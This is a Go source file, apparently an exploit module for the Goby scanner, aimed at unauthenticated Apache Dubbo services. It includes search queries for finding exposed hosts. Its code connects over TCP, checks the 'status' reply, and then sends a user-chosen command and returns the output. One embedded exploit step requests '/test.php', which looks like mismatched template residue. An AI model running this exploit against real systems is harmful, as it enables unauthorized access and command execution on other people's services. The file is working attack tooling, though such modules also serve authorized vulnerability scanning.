package exploits

import (
	"strings"
	"time"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Apache Dubbo Unauthorized Access Vulnerability",
    "Description": "<p>Apache Dubbo is an RPC service development framework used to solve service governance and communication problems under the microservice architecture, and officially provides multi-language SDK implementations such as Java and Golang. The microservices developed with Dubbo natively have the ability to discover and communicate with each other's remote addresses, and can use the rich service governance features provided by Dubbo to achieve service governance requirements such as service discovery, load balancing, and traffic scheduling. Dubbo is designed to be highly scalable, allowing users to easily implement a variety of custom logic for traffic interception and site selection.</p><p>Apache Dubbo is an open-source high-performance and excellent service framework from Alibaba, which enables applications to realize service output and input functions through high-performance RPC, and can be seamlessly integrated with the Spring framework. Unauthorized access vulnerability due to improper configuration of Dubbo.</p>",
    "Product": "Apache Dubbo",
    "Homepage": "https://cn.dubbo.apache.org/",
    "DisclosureDate": "2022-01-27",
    "Author": "2974057526@qq.com",
    "FofaQuery": "header=\" realm=\\\\\\\"dubbo\\\\\\\"\" || banner=\" realm=\\\\\\\"dubbo\\\\\\\"\" || title==\"Dubbo\" || banner=\"Unsupported command: GET\" || banner=\"Unsupported command 'GET'\" || protocol=\"apache-dubbo\"",
    "GobyQuery": "header=\" realm=\\\\\\\"dubbo\\\\\\\"\" || banner=\" realm=\\\\\\\"dubbo\\\\\\\"\" || title==\"Dubbo\" || banner=\"Unsupported command: GET\" || banner=\"Unsupported command 'GET'\" || protocol=\"apache-dubbo\"",
    "Level": "2",
    "Impact": "<p>Apache Dubbo is an open-source high-performance and excellent service framework from Alibaba, which enables applications to realize service output and input functions through high-performance RPC, and can be seamlessly integrated with the Spring framework. Unauthorized access vulnerability due to improper configuration of Dubbo.</p>",
    "Recommendation": "<p>Configure dubbo authentication;</p><p>Set firewall policies to restrict IP access.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ls",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "Tips",
        "content": "请直接点击利用或验证。"
    },
    "ScanSteps": [
        {
            "NetTest": {
                "Timeout": 20,
                "Packets": [
                    {
                        "Request": {
                            "SendData": "status\r\n"
                        },
                        "ResponseTest": {
                            "Type": "item",
                            "RecvSize": 1024,
                            "Variable": "$buf",
                            "Operation": "contains",
                            "Value": "OK"
                        }
                    }
                ]
            }
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Apache Dubbo 未授权访问漏洞",
            "Product": "Apache Dubbo",
            "Description": "<p>Apache Dubbo 是一款 RPC 服务开发框架，用于解决微服务架构下的服务治理与通信问题，官方提供了 Java、Golang 等多语言 SDK 实现。使用 Dubbo 开发的微服务原生具备相互之间的远程地址发现与通信能力， 利用 Dubbo 提供的丰富服务治理特性，可以实现诸如服务发现、负载均衡、流量调度等服务治理诉求。Dubbo 被设计为高度可扩展，用户可以方便的实现流量拦截、选址的各种定制逻辑。</p><p>Apache Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞。<br></p>",
            "Recommendation": "<p>配置 dubbo 认证;</p><p>设置防火墙策略以限制 IP 访问。</p>",
            "Impact": "<p>Apache Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞。</p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Apache Dubbo Unauthorized Access Vulnerability",
            "Product": "Apache Dubbo",
            "Description": "<p>Apache Dubbo is an RPC service development framework used to solve service governance and communication problems under the microservice architecture, and officially provides multi-language SDK implementations such as Java and Golang. The microservices developed with Dubbo natively have the ability to discover and communicate with each other's remote addresses, and can use the rich service governance features provided by Dubbo to achieve service governance requirements such as service discovery, load balancing, and traffic scheduling. Dubbo is designed to be highly scalable, allowing users to easily implement a variety of custom logic for traffic interception and site selection.</p><p>Apache Dubbo is an open-source high-performance and excellent service framework from Alibaba, which enables applications to realize service output and input functions through high-performance RPC, and can be seamlessly integrated with the Spring framework. Unauthorized access vulnerability due to improper configuration of Dubbo.</p>",
            "Recommendation": "<p>Configure dubbo authentication;</p><p>Set firewall policies to restrict IP access.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Apache Dubbo is an open-source high-performance and excellent service framework from Alibaba, which enables applications to realize service output and input functions through high-performance RPC, and can be seamlessly integrated with the Spring framework. Unauthorized access vulnerability due to improper configuration of Dubbo.</span><br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PostTime": "2024-03-21",
    "PocId": "10936"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			c, err := httpclient.GetTCPConn(hostInfo.HostInfo, time.Second*20)
			if err != nil {
				return false
			}
			c.Write([]byte("status\r\n"))
			resp := make([]byte, 2048)
			_, _ = c.Read(resp)
			if resp != nil && strings.Contains(string(resp), "OK") {
				ss.VulURL = "apache-dubbo://" + hostInfo.HostInfo
				defer c.Close()
				return true
			} else {
				return false
			}
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			c, err := httpclient.GetTCPConn(expResult.HostInfo.HostInfo, time.Second*10)
			if err != nil {
				return expResult
			}
			cmd := goutils.B2S(ss.Params["cmd"])
			c.Write([]byte(cmd + "\r\n"))
			resp := make([]byte, 2048)
			_, _ = c.Read(resp)
			if resp != nil {
				expResult.Output = strings.Split(string(resp), "dubbo")[0]
				expResult.Success = true
				defer c.Close()
				return expResult
			} else {
				return expResult
			}
		},
	))
}
